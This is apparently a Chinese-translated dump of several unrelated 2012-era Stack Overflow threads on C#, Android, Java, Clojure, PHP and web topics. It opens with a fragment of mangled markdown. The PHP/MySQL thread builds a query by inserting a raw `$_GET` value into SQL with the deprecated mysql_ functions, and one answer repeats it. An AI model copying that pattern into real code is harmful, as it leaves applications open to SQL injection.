好的，我做了[这个小提琴](http://jsfiddle.net/V5fv3/)希望是你想要的。

基本上你应该关注这个：

*   给标题和它的子列相同的类
*   为要切换的那些标题设置***colspan属性***
*   为每个标头设置一个***data-fullcol***属性以跟踪它们的最大*colspan*
*   仅绑定到具有***colspan****属性**的那些列的***单击事件**
***   为您希望*保持可见*的那些列提供***一流*的服务****   在点击事件中隐藏其类不等于单击的标题的所有列并且还没有*第一*类*   将所有其他标题*colspan*设置为 1*   **切换**与您单击的标题具有相同类的所有列*   切换标题的*colspan*将*colspan*设置为(data- **fullcol** ***- colspan +1)******

 *******注意：这仅在标题具有单个类时才有效，如果您想给它们提供多个类，请考虑将“重要类”保存在特定属性中，例如*data-class********

# c# - 如何避免重复 Cursor.Current 语句？

> ID：12659696
> 
> 赞同：1
> 
> 时间：2012-09-30T08:03:51.953
> 
> 标签：c#, error-handling, cursor, try-catch-finally

如果我在`WaitCursor`处理任务之前打开然后将其恢复为默认值，我经常会得到这种代码模式：

```
try {
    Cursor.Current = Cursors.WaitCursor;
    MyProcessingTask();
}
catch (Exception ex) {
    Cursor.Current = Cursors.Default;
    MessageBox.Show(ex.ToString());
}
finally { Cursor.Current = Cursors.Default; } 
```

我需要`Cursor.Current = Cursors.Default;`在`catch`块中有 ，以便`MessageBox`给定一个默认光标来使用。

有没有更好的方法来编写此代码而无需编写两个`Cursor.Current = Cursors.Default;`语句？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:11:19.760

您可以创建一个一次性类并利用`using`语法糖，即：

```
class WaitingCursor : IDisposable
{
    public WaitingCursor()
    {
        Cursor.Current = Cursors.WaitCursor;
    }
    public void Dispose()
    {
        Cursor.Current = Cursors.Default;
    }
} 
```

用法：

```
try
{
    using (var wcurs = new WaitingCursor())
    {
        MyProcessingTask();
    }
}
catch (Exception ex)
{
    MessageBox.Show(ex.ToString());
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:11:51.357

您可以在`try`/`finally`块内嵌套`try`/`catch`块：

```
try {
    try {
        Cursor.Current = Cursors.WaitCursor;
        MyProcessingTask();
    }
    finally { Cursor.Current = Cursors.Default; }
}
catch (Exception ex) {
    MessageBox.Show(ex.ToString());
} 
```

这是否*更好*可能取决于意见。它减少了一些代码重复，但它（在我看来）并没有“熟悉”的外观。有人可能会在 6 个月的时间内看到这一点，并将其重构回熟悉的`try`//结构`catch`（`finally`并丢失块中的光标更改`catch`）。

* * *

顺便说一句 - 在这个低级别捕获*所有*异常的一般模式通常是不受欢迎的。通过仅显示 来“处理”所有可能的异常`Message`，您将失去潜在的调试帮助。我通常会建议 a) 你只处理你的代码实际上有一个明智的策略来处理的*特定*异常，并且 b) 让所有其他异常传播到顶级异常处理程序 a) 可能显示一条消息，但是 b ) 还会记录异常的所有相关部分，包括调用堆栈等。

吞下异常（如这里）可能意味着应用程序不处于适合继续运行的状态，但会尝试这样做。使最终崩溃（如果发生）更加难以诊断。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T08:12:48.970

这样的事情怎么样

```
 Exception exception = null;
        try
        {
            Cursor.Current = Cursors.WaitCursor;
            MyProcessingTask();
        }
        catch (Exception ex)
        {
            exception = ex;
        }

        Cursor.Current = Cursors.Default;
        if (exception!= null)
            MessageBox.Show(exception.ToString()); 
```

尽管这似乎是一个合理的解决方案，但我宁愿建议保留双光标设置，因为我希望所有异常逻辑都在 Catch 块内处理。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T08:12:57.467

在现有语句的块中嵌套一个`try ... finally`语句，如下所示：`try``try ... catch`

```
try {
    Cursor.Current = Cursors.WaitCursor;
    try {
        MyProcessingTask();
    }
    finally {
        Cursor.Current = Cursors.Default;
    }
}
catch (Exception ex) {
    MessageBox.Show(ex.ToString());
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-30T08:20:33.703

您可以通过扩展方法来简化它：

```
static void ProcessWithWaitCursor(this Action task)
{
    try {
        Cursor.Current = Cursors.WaitCursor;
        task();
    }
    catch (Exception ex) {
        Cursor.Current = Cursors.Default;
        MessageBox.Show(ex.ToString());
    }
    finally { Cursor.Current = Cursors.Default; } 
```

}

然后像这样使用它：

```
MyProcessingTask.ProcessWithWaitCursor() 
```

这将消除您想要执行此操作的所有地方的所有重复代码。

# android - 在图像上写入文本并将图像与文本一起保存在 SD 卡中，而不在屏幕上绘制

> ID：12659704
> 
> 赞同：3
> 
> 时间：2012-09-30T08:05:05.403
> 
> 标签：android, canvas, view, bitmap, android-custom-view

我已经为这个问题苦苦挣扎了很长时间。**我想从资源文件夹中获取图像并写入一些文本，作为进程的一部分动态生成，然后将带有文本的最终图像保存在 SD 卡中。**我知道如何在 SD 卡中写入文件。我无法在图像上写文字。

我用 imageview 和 textview 创建了一个 RelativeLayout 并将其保存到 SD 卡，但后来意识到我不必绘制视图。所以，不能这样下去。

再次强调一点，我的应用程序不需要在当前屏幕上绘制位图。

有人可以在这里提供任何解决方案吗？

谢谢！:)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-30T08:44:18.680

不要为此使用图像视图。

使用画布！

```
Bitmap bm = BitmapFactory.decodeResource(getResources(), R.drawable.image);
Bitmap alteredBitmap = Bitmap.createBitmap(bm.getWidth(), bm.getHeight(), bm.getConfig());
Canvas canvas = new Canvas(alteredBitmap);
Paint paint = new Paint();
canvas.drawBitmap(bm, 0, 0, paint);
paint.setColor(Color.BLACK); 
paint.setTextSize(20); 
canvas.drawText("Some Text", 10, 25, paint); 
```

然后只需将“alteredBitmap”保存到 SD 卡

# javascript - 如何让鼠标右键变成纯死机？

> ID：12659705
> 
> 赞同：0
> 
> 时间：2012-09-30T08:05:33.557
> 
> 标签：javascript, jquery, mouseevent, client-side, right-click

使鼠标右键单击是纯粹的死。即使编辑 javascript 或其他任何内容，也不允许右键单击访问。

通过如下所示禁用右键单击后

```
window.oncontextmenu = function () {
   return false;
} 
```

仍然用户可以通过以下方式重新启用右键单击访问

```
javascript:void(document.oncontextmenu=null) 
```

有没有办法完全阻止右键访问？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:09:26.447

我不认为你能做到这一点。这是在用户的机器上运行的。用户可以随时更改它以获得他想要的。

我猜你想这样做是为了防止他/她做一个视图源。但请记住，他们可以在 chrome 中加载它并使用 Tools -> Developer tools 选项并查看您的源代码。而且你真的不能禁用用户的浏览器控件。:-)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T08:12:11.117

你不能完全做到这一点。Javascript 是一种客户端脚本语言如果用户禁用了 javascript，那么他/她将能够点击。你应该是用户友好的

但是，如果您想这样做，请使用此

```
​document.onclick = function(e) 
 {
   if( e.which== 3 )
       {
         e.preventDefault();
              //or 
         return false;
       };​
 } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T08:12:13.140

不，你不能也不应该，因为如果你能以某种方式实现它，用户会很生气......创建浏览器是为了尽可能地对用户友好，并通过强制禁用你正在采取的右键单击立即从用户那里获得，没有浏览器允许您这样做。

# clojure - 由于重复性错误，leiningen 构建失败

> ID：12659707
> 
> 赞同：2
> 
> 时间：2012-09-30T08:07:06.110
> 
> 标签：clojure, leiningen

我已经和 lein2 一起工作了一段时间，它一直运行良好。但是今天麻烦开始了，无论我用 lein2 输入哪个命令，它都会给我以下错误。我尝试删除〜/ .m2，在这种情况下它会再次下载deps，但最后给了我同样的错误。

我也试过删除并再次下载 lein2。以下是它给出的错误 -

> 检查 :dependencies 和 :repositories 是否有错别字。指定的 jar 可能不在任何存储库中。[如果是这样，请参阅http://j.mp/repeatability](http://j.mp/repeatability)下的“自由浮动罐子”无法解析依赖项

无论项目或文件夹如何，都会发生错误。下面是我的 ~/.lein/profiles.clj -

```
{:user {:plugins [[lein-immutant "0.8.1"]
                  [lein-difftest "1.3.7"]
                  [lein-marginalia "0.7.1"]
                  [lein-pprint "1.1.1"]
                  [lein-swank "1.4.4"]
                  [lein-ring "0.7.5"]
                  [lein-cljsbuild "0.2.7"]
                  [lein-eclipse "1.0.0"]
                  [lein-git-deps "0.0.1-SNAPSHOT"]
                  [lein-outdated "0.1.0"]
                  [lein-noir "1.2.1"]
                  [lein-beanstalk "0.2.2"]
                  [lein-cloudbees "1.0.0"]
                  [lein-pedantic "0.0.3"]
                  [clj-ns-browser "1.3.0"]
                  [lein-ritz "0.4.2"]
                  [lein-midje "2.0.0-SNAPSHOT"]]}} 
```

下面是 project.clj 文件 -

```
(defproject hs-2 "0.1.0-SNAPSHOT"
  :description "FIXME: write description"
  :url "http://example.com/FIXME"
  :license {:name "Eclipse Public License"
            :url "http://www.eclipse.org/legal/epl-v10.html"}
  :dependencies [[org.clojure/clojure "1.4.0"]
                 [net.cgrand/moustache "1.1.0" :exclusions [org.clojure/clojure]]
                 [enlive "1.0.1" :exclusions [org.clojure/clojure]]
                 [ring "1.1.5"]
                 [clj-time "0.4.4"]
                 [clj-http "0.5.3"]
                 [org.thnetos/cd-client "0.3.4" :exclusions [[org.clojure/clojure] cheshire]]
                 [clojurewerkz/urly "1.0.0"]
                 [clj-airbrake "2.0.0"]]
  :profiles {:dev {:dependencies [[ring-serve "0.1.2"]
                                  [ring-mock "0.1.3"]
                                  [ritz/ritz-debugger "0.4.2"]
                                  [ritz/ritz-repl-utils "0.4.2"]
                                  [midje "1.4.0" :exclusions [org.clojure/clojure]]]}}
  :ring {:handler hs-2.routes/my-app}
  :repl-options {:init-ns hs-2.core
                 :init (do
                         (use 'hs-2.routes)
                         (use 'ring.util.serve)
                         (serve my-app)
                         (use 'ring.mock.request)
                         )}
  :resource-paths ["resources/public"]
  :pedantic :warn) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-01T13:03:01.123

这是因为您正在使用 SNAPSHOT 依赖项。`export LEIN_SNAPSHOTS_IN_RELEASE=1`在您的 shell 或`lein`脚本中设置以覆盖它。

# java - 这段java代码是做什么的？

> ID：12659710
> 
> 赞同：0
> 
> 时间：2012-09-30T08:07:30.293
> 
> 标签：java

我在java中遇到了这段代码，想知道它的作用。

```
public class Max <Key extends Comparable<Key>>{
  key[] pq; 
  ....
  ....
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T08:11:02.827

上面的方法定义说....

`public` **-**访问修饰符

`class` **-**定义类的关键字

`Max` **-**班级名称

`<Key extends Comparable<Key>>` **-**这个类是`Type Parametrized`，其中`Key`是一个`Interface`将**扩展** `java.util.Comparable`接口类型的类`Key`。

这里还要注意的一件事是`key[] pq`，我认为如果您在任何地方都**没有**定义`key`，那么它应该是`Key[] pq`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T08:12:08.793

上面的语句定义了通用（或参数化）类型 Max。

参数`Key extends Comparable<Key>`意味着该参数可能只是一个扩展接口的接口`java.lang.Comparable`。

可能对你来说更清楚，`Key extends Comparable<Key>`相当于`T extends Comparable<T>`

您可能想通过查看[此链接进一步探索它](http://www.angelikalanger.com/GenericsFAQ/FAQSections/ParameterizedTypes.html#FAQ001)

# c# - 在 C# 中捕获 Web 浏览器输出

> ID：12659712
> 
> 赞同：2
> 
> 时间：2012-09-30T08:07:33.810
> 
> 标签：c#

在控制台应用程序中，我需要捕获输出。有2种情况：

*   互联网无法显示网页
*   互联网正在运行。

我正在使用下面的代码

```
using(WebClient client = new WebClient())
{
    string pageData;
    try
    {
        pageData = client.DownloadString("https://google.com");
    }
    catch (HttpListenerException e)
    {
        Console.WriteLine("Exception is" + e);
    } 
```

在这里我需要应用一个条件，如果 Internet Explorer 显示“Internet Explorer 无法显示网页”，那么它应该显示没有连接。我需要捕获输出。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T10:44:53.367

您需要捕获 Web 客户端因任何原因无法下载页面时引发的 WebException。试试这个：

```
public static bool IsAlive(string url)
{
    bool isAlive = false;
    using (WebClient client = new WebClient())
    {
        try
        {
            var content = client.DownloadString(url);
            // if we got this far there was no error fetching the content
            isAlive = true;
        }
        catch (WebException ex)
        {
            // could not fetch page - can output reason here if required
            Console.WriteLine("Error when fetching {0}: {1}", url, ex);
        }

    }

    return isAlive;
} 
```

有关详细信息，请参阅 MSDN 上的[WebClient](http://msdn.microsoft.com/en-us/library/ms144200%28v=vs.110%29.aspx)文档。

# ruby-on-rails - ruby 企业版 (REE) 是否与乘客 3.0.17 兼容？

> ID：12659714
> 
> 赞同：0
> 
> 时间：2012-09-30T08:07:43.633
> 
> 标签：ruby-on-rails, nginx, passenger, ruby-enterprise-edition, phusion

我正在使用 REE

```
ruby 1.8.7 (2012-02-08 MBARI 8/0x6770 on patchlevel 358) [x86_64-linux], MBARI 0x6770, Ruby Enterprise Edition 2012.02 
```

来自[http://rubyenterpriseedition.googlecode.com/files/ruby-enterprise_1.8.7-2012.02_amd64_debian6.0.deb](http://rubyenterpriseedition.googlecode.com/files/ruby-enterprise_1.8.7-2012.02_amd64_debian6.0.deb)

此 REE 是否与乘客 3.0.17 兼容，有关更多信息，请访问 [Debian 6.0.5 amd64 上的 Phusion Passenger Nginx 模块安装程序 v3.0.17 问题，因为包损坏](https://stackoverflow.com/questions/12643845/phusion-passenger-nginx-module-installer-v3-0-17-issue-on-debian-6-0-5-amd64-due)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:22:14.883

是的。Phusion Passenger 一直支持 Ruby 版本，直到 1.8.5。

# python - Windows：在 Windows 资源管理器中按下 Ctrl+C 时实际发生的情况

> ID：12659719
> 
> 赞同：1
> 
> 时间：2012-09-30T08:08:20.687
> 
> 标签：python, windows, winapi, python-2.7, pywin32

我正在使用 Python 为 Windows 操作系统设计一个复制/粘贴应用程序。现在我想用“Ctrl+V”的热键注册我的应用程序，这样当任何人按下“Ctrl+V”时，粘贴是通过我的应用程序完成的，而不是通过windows默认复制/粘贴应用程序。但我不知道如何获取要复制的文件路径列表以及要完成粘贴的目标窗口的路径。所以我想知道当有人在 Windows 资源管理器中按 Ctrl+C 键

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T08:30:30.477

当有人在 Explorer 中按下 Ctrl+C 键时，Explorer会`OleSetClipboard()`以`IDataObject`包含各种格式的调用，其中可能包括`CF_FILES`,`CFSTR_FILECONTENTS`和`CFSTR_SHELLIDLIST`.

# java - Spring security 保存的 URL RequestCache 不存储#（散列）

> ID：12659728
> 
> 赞同：1
> 
> 时间：2012-09-30T08:10:59.770
> 
> 标签：java, spring, security, authentication, spring-security

> **可能重复：**
> [如何从服务器端获取 Url Hash (#)](https://stackoverflow.com/questions/317760/how-to-get-url-hash-from-server-side)

我正在使用 Spring 安全性来保护我们应用程序上的资源。不幸的是，spring 不存储包含 # 的完整 url。例如：

```
example.com/account/file#1234 
```

在`#1234`被重定向到登录页面和安全进程之前，它不会存储在请求缓存中。从身份验证返回后，重定向到的 url 为：

```
example.com/account/file 
```

有什么方法可以让 spring 存储完整的 url？

# facebook - 脸书应用认证

> ID：12659736
> 
> 赞同：0
> 
> 时间：2012-09-30T08:11:59.817
> 
> 标签：facebook, facebook-graph-api, facebook-access-token

我正在尝试在 python 中制作原生 facebook 应用程序。我有扩展权限的问题，在 facebook 应用程序页面上，我输入了一些我需要的权限，但是当我尝试通过以下方式获取访问令牌时： `https://www.facebook.com/dialog/oauth?client_id=YOUR_APP_ID&redirect_uri=https://www.facebook.com/connect/login_success.html&response_type=token`

我得到身份验证对话框，它告诉应用程序只接收基本信息，看起来它与我在 facebook 上的应用程序页面中提到的扩展权限无关。

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:50:18.123

您可以在创建应用程序时添加额外的权限。您可以从这里获取更多信息，

[https://developers.facebook.com/docs/opengraph/authentication/](https://developers.facebook.com/docs/opengraph/authentication/)

另一种方法是您可以在身份验证对话框 url 本身中添加逗号分隔的权限，如下所示

```
https://www.facebook.com/dialog/oauth?
client_id=YOUR_APP_ID
&redirect_uri=YOUR_REDIRECT_URI
&scope=COMMA_SEPARATED_LIST_OF_PERMISSION_NAMES
&state=SOME_ARBITRARY_BUT_UNIQUE_STRING 
```

更多细节

[http://developers.facebook.com/docs/authentication/server-side/](http://developers.facebook.com/docs/authentication/server-side/)

# c++ - 如何在 C++ 中读取文件时向前看多个步骤

> ID：12659741
> 
> 赞同：2
> 
> 时间：2012-09-30T08:12:21.323
> 
> 标签：c++, file, newline, delimiter

我有一个输入文件，它由多个由空格或换行符分隔的整数组成。前任：

```
7\n
2 2\n
3 4\n
\n
8\n
3 1\n
5 6\n
7 7\n
\n
3\n
1 2\n
3 4\n 
```

.... 等等。

我需要根据这个输入文件来决定我有多少个不同的输入集。我无法做到这一点。有小费吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T08:34:47.523

逐行读取文件。每次读取后，检查流中的下一个字符是什么。如果是`'\n'`（或 EOF），则您处于输入集的末尾。

```
std::string line;
std::ifstream stream;
size_t sets = 0;

while (std::getline(stream, line)) {

    // do something with line

    int next = stream.get()
    if (next == '\n' || next == EOF)
        ++sets;
    else
        stream.putback(next);
} 
```

# php - Mysql 选择成数组

> ID：12659744
> 
> 赞同：0
> 
> 时间：2012-09-30T08:12:54.820
> 
> 标签：php, mysql

我基本上只是想从一个表中选择一个数组......它不能正常工作。

我有以下查询

```
$graph = mysql_query("SELECT MONTHNAME(dateadded) MONTH, COUNT(*) COUNT
FROM products
WHERE ((YEAR(dateadded)=2012) && (site_url = '$_GET[site_url_graph]'))
GROUP BY MONTH(dateadded)",$db); 
```

我需要将结果放在这样的数组中（可以是长或短的月份名称，这不是问题）：

```
$data = array(
    'Jan' => 12,
    'Feb' => 25,
    'Mar' => 0,
    'Apr' => 7,
    'May' => 80,
    'Jun' => 67,
    'Jul' => 45,
    'Aug' => 66,
    'Sep' => 23,
    'Oct' => 23,
    'Nov' => 78,
    'Dec' => 6
); 
```

我正在尝试这个，但收到的消息不是数组：

```
$data = array();
while($graphData = mysql_fetch_array($graph)){
    $data[] = $graphData;
    } 
```

我敢肯定这是一个简单的修复，但在这里扯掉头发！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:26:27.330

要获得预期的数组，您需要按照以下方式更改代码。

```
$data = array();
while($graphData = mysql_fetch_array($graph)){
    $data[$graphData['MONTH']] = $graphData['COUNT'];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T12:06:15.823

```
$graph = mysql_query("SELECT MONTHNAME(dateadded) MONTH, COUNT(*) COUNT
                      FROM products
                      WHERE ((YEAR(dateadded)=2012) && (site_url = '$_GET[site_url_graph]'))
                      GROUP BY MONTH(dateadded)",$db);

$data = array();
while(list($month, $count) = mysql_fetch_array($graph)) {
    $data[$month] = $count; 
} 
```

所以，基本上这是你想要的快速而轻松的版本。注意列表的用法。很好读。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-30T08:20:32.747

也许这就是问题所在：
“ `COUNT(*) COUNT`”？尝试将其更改为`COUNT(*)`

# android - 从片段调用活动方法

> ID：12659747
> 
> 赞同：361
> 
> 时间：2012-09-30T08:12:58.300
> 
> 标签：android, android-fragments

试图从片段中调用我的活动中的方法。我希望片段提供方法数据并在方法返回时获取数据。我想实现类似于调用静态方法，但不使用静态，因为它会在活动中产生问题。

片段新手，所以我需要一个简单而有教学意义的解释！

谢谢！

* * *

## 回答 #1

> 赞同：909
> 
> 时间：2012-09-30T08:23:29.280

**从片段到活动：**

```
((YourActivityClassName)getActivity()).yourPublicMethod(); 
```

**从活动到片段：**

```
FragmentManager fm = getSupportFragmentManager();

//if you added fragment via layout xml
YourFragmentClass fragment = (YourFragmentClass)fm.findFragmentById(R.id.your_fragment_id);
fragment.yourPublicMethod(); 
```

如果您通过代码添加片段并在添加片段`tag`时使用了字符串，请`findFragmentByTag`改用：

```
YourFragmentClass fragment = (YourFragmentClass)fm.findFragmentByTag("yourTag"); 
```

* * *

## 回答 #2

> 赞同：221
> 
> 时间：2012-10-02T02:05:40.827

您可能应该尝试将片段与活动分离，以防您想在其他地方使用它。您可以通过创建您的活动实现的接口来做到这一点。

因此，您将定义一个如下所示的接口：

例如，假设您想给活动一个字符串并让它返回一个整数：

```
public interface MyStringListener{
    public Integer computeSomething(String myString);
} 
```

这可以在片段或单独的文件中定义。

然后你会让你的活动实现接口。

```
public class MyActivity extends FragmentActivity implements MyStringListener{

  @Override
  public Integer computeSomething(String myString){
   /** Do something with the string and return your Integer instead of 0 **/ 
   return 0;
  }

} 
```

然后在您的片段中，您将有一个 MyStringListener 变量，您将在片段的 onAttach(Activity activity) 方法中设置侦听器。

```
public class MyFragment {

        private MyStringListener listener;

        @Override
        public void onAttach(Context context) {
            super.onAttach(context);
            try {
                listener = (MyStringListener) context;
            } catch (ClassCastException castException) {
                /** The activity does not implement the listener. */
            }
        }

    } 
```

编辑（17.12.2015）：`onAttach(Activity activity) is deprecated, use onAttach(Context context) instead, it works as intended`

第一个答案肯定有效，但它将您当前的片段与主机活动相结合。如果您想在另一个活动中使用它，将片段与主机活动分离，这是一种很好的做法。

* * *

## 回答 #3

> 赞同：88
> 
> 时间：2018-03-14T08:57:42.273

对于**Kotlin**开发人员

```
(activity as YourActivityClassName).methodName() 
```

对于**Java**开发人员

```
((YourActivityClassName) getActivity()).methodName(); 
```

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2015-03-04T15:01:49.783

在我了解更多片段如何工作后更新。每个片段都属于一个父活动。所以只需使用：

```
getActivity().whatever 
```

从片段内部。这是一个更好的答案，因为您避免了多余的演员表。如果您无法使用此解决方案避免演员阵容，请使用以下解决方案。

=============

你要做的就是投射到外部活动

```
((MainActivity) getActivity()).Method(); 
```

创建一个新实例会混淆 android 框架并且它无法识别它。也可以看看 ：

[https://stackoverflow.com/a/12014834/1984636](https://stackoverflow.com/a/12014834/1984636)

[https://stackoverflow.com/a/2042829/1984636](https://stackoverflow.com/a/2042829/1984636)

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2016-05-11T11:00:35.260

虽然我完全喜欢 Marco 的回答，但我认为公平地指出，您也可以使用基于发布/订阅的框架来实现相同的结果，例如，如果您使用事件总线，您可以执行以下操作

**片段：**

```
EventBus.getDefault().post(new DoSomeActionEvent()); 
```

**活动：**

```
 @Subscribe
onSomeActionEventRecieved(DoSomeActionEvent doSomeActionEvent){
//Do something

} 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2018-05-31T07:45:02.660

在 kotlin 中，您可以从片段中调用活动方法，如下所示：

```
var mainActivity: MainActivity = activity as MainActivity
        mainActivity.showToast() //Calling show toast method of activity 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2020-07-15T09:19:00.010

感谢@BIJAY_JHA 和@Manaus。我使用 Kotlin 版本来调用我的 signIn() 方法，该方法位于 Activity 中并且我从 Fragment 调用。我在 Android 中使用导航架构，因此侦听器接口模式不在片段中：

```
 (activity as MainActivity).signIn() 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2021-01-05T19:08:43.233

我是这样做的：

首先制作界面

```
interface NavigationInterface {
    fun closeActivity()
} 
```

接下来确保活动实现接口并覆盖接口方法

```
class NotesActivity : AppCompatActivity(), NavigationInterface {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_notes)
        setSupportActionBar(findViewById(R.id.toolbar))
    }

    override fun closeActivity() {
        this.finish()
    }
} 
```

然后确保在片段中创建接口侦听器

```
private lateinit var navigationInterface: NavigationInterface

override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
): View? {
    //establish interface communication
    activity?.let {
        instantiateNavigationInterface(it)
    }
    // Inflate the layout for this fragment
    return inflater.inflate(R.layout.fragment_notes_info, container, false)
}

private fun instantiateNavigationInterface(context: FragmentActivity) {
    navigationInterface = context as NavigationInterface
} 
```

那么你可以像这样拨打电话：

```
view.findViewById<Button>(R.id.button_second).setOnClickListener {
    navigationInterface.closeActivity()
} 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2016-08-26T08:05:38.610

要通过片段访问 Activity 中声明的函数，请使用接口，如 marco 的回答所示。

要通过您的活动访问片段中声明的函数，如果您没有标签或 ID，则可以使用它

```
private void setupViewPager(ViewPager viewPager) {
    //fragmentOne,fragmentTwo and fragmentThree are all global variables
    fragmentOne= new FragmentOne();
    fragmentTwo= new FragmentTwo();
    fragmentThree = new FragmentThree();

    viewPagerAdapteradapter = new ViewPagerAdapter(getSupportFragmentManager());
    viewPagerAdapteradapter.addFragment(fragmentOne, "Frag1");
    viewPagerAdapteradapter.addFragment(fragmentTwo, "Frag2");
    viewPagerAdapteradapter.addFragment(fragmentThree, "Frag3");

    //viewPager has to be instantiated when you create the activity:
    //ViewPager viewPager = (ViewPager)findViewById(R.id.pager);
    //setupViewPager(viewPager);
    //Where R.id.pager is the id of the viewPager defined in your activity's xml page.

    viewPager.setAdapter(viewPagerAdapteradapter);

    //frag1 and frag2 are also global variables
    frag1 = (FragmentOne)viewPagerAdapteradapter.mFragmentList.get(0);
    frag2 = (FragmentTwo)viewPagerAdapteradapter.mFragmentList.get(1);;

    //You can use the variable fragmentOne or frag1 to access functions declared in FragmentOne

} 
```

这是 ViewpagerAdapterClass

```
 class ViewPagerAdapter extends FragmentPagerAdapter {
    public final List<Fragment> mFragmentList = new ArrayList<>();
    private final List<String> mFragmentTitleList = new ArrayList<>();

    public ViewPagerAdapter(FragmentManager manager) {
        super(manager);
    }

    @Override
    public Fragment getItem(int position) {
        return mFragmentList.get(position);
    }

    @Override
    public int getCount() {
        return mFragmentList.size();
    }

    public void addFragment(Fragment fragment, String title) {
        mFragmentList.add(fragment);
        mFragmentTitleList.add(title);
    }

    @Override
    public CharSequence getPageTitle(int position) {
        return mFragmentTitleList.get(position);
    }
} 
```

这个答案适合我这样的菜鸟。祝你有美好的一天。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2016-08-18T12:14:45.647

# 这是来自片段类...

```
((KidsStoryDashboard)getActivity()).values(title_txt,bannerImgUrl); 
```

## 活动类中的此代码...

```
 public void values(String title_txts, String bannerImgUrl) {
    if (!title_txts.isEmpty()) {

//Do something to set text 
    }
    imageLoader.displayImage(bannerImgUrl, htab_header_image, doption);
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2018-06-09T00:02:35.390

我一直在寻找最好的方法来做到这一点，因为并非我们要调用的每个方法都位于具有相同 Activity Parent 的 Fragment 中。

在你的片段中

```
public void methodExemple(View view){

        // your code here

        Toast.makeText(view.getContext(), "Clicked clicked",Toast.LENGTH_LONG).show();
    } 
```

在您的活动中

```
new ExempleFragment().methodExemple(context); 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-05-17T13:13:51.090

我已经尝试了这个线程中显示的所有方法，但没有一个对我有用，试试这个。它对我有用。

```
((MainActivity) getContext().getApplicationContext()).Method(); 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2019-09-26T14:44:53.503

```
((your_activity) getActivity).method_name() 
```

where`your_activity`是您的活动`method_name()`的名称，是您要调用的方法的名称。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2020-02-24T07:51:29.620

对于 Kotlin 试试看

```
class DataForm : Fragment() {
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        Tasks(this).getData()
    }

    fun getResponse(response: String) {
        // code
    }
}

class Tasks(private val context: Any) {
    fun getData() {

        val getContext = (context as DataForm).activity
        val getFragment = (context as DataForm)

        val responseListener = Response.Listener<String> { response ->
            getFragment.getResponse(response)
        }

        val errorListener = Response.ErrorListener { error ->
            error.printStackTrace();
        }

        val stringRequest = StringRequest(Request.Method.GET, url, responseListener, errorListener)
        Volley.newRequestQueue(getContext).add(stringRequest)
    }
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2019-01-28T08:03:37.243

`((YourActivityName)getActivity()).functionName();`

例子 ：`((SessionActivity)getActivity()).changeFragment();`

注意：类名应该是公开的

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2021-08-28T06:33:14.907

**从片段到活动：**

((YourActivityClassName)requireActivity()).yourPublicMethod();

* * *

## 回答 #17

> 赞同：-1
> 
> 时间：2022-01-31T14:00:18.807

从各自的片段调用活动方法的最佳方式

```
(activity as YourActivity).activtiyMethod() 
```

从你的活动中使用这条线。例如

Suppose You have Activity **A** and method *add()* and your fragment **ABC** and you want to call the method add from Fragment ABC,

```
(activity as A).add() 
```

# wordpress - Wordpress 新安装 - 错误：在此服务器上找不到请求的 URL /blog/index.php

> ID：12659748
> 
> 赞同：0
> 
> 时间：2012-09-30T08:13:21.027
> 
> 标签：wordpress

重新安装 WordPress 3.4.2 当我尝试使用安装博客时`.../blog/wp-admin/install.php`

我收到一条错误消息：

> 未找到 在此服务器上未找到请求的 URL /blog/index.php。mysite.com 上的 Apache/2.2 服务器端口 80

1.  我删除了文件夹中的所有文件并再次安装，同样的消息。
2.  我试图将 install.php 和 index.php 的文件权限更改为 755，仍然没有工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T11:40:47.307

> > 我试图将 install.php 和 index.php 的文件权限更改为 755，仍然没有工作

您是否检查了文件的所有者和组？该类型的命令将帮助您更改权限： Root > chown -R user:user /path/to/files

建议使用自动安装程序来安装广泛的脚本库。

# php - 如何解决“严格标准：只能通过引用传递变量”？

> ID：12659750
> 
> 赞同：0
> 
> 时间：2012-09-30T08:13:33.653
> 
> 标签：php, html, mysql

有人可以帮我处理这 4 行代码吗？我一直在尝试阅读如何修复此错误，但我对 php 还不是很熟悉。

```
$currentFile = $_SERVER["SCRIPT_NAME"];
